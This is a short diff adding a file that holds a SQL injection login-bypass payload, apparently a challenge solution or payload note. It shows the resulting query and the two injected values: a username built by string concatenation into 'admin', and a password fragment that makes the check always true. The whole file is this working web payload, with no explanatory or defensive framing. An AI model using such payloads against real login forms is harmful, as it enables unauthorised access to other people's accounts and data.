@@ -1,0 +1,4 @@
+SELECT username, password FROM users WHERE username='ad'||'min' AND password='a' IS NOT 'b'
+
+ad'||'min
+a' IS NOT 'b 
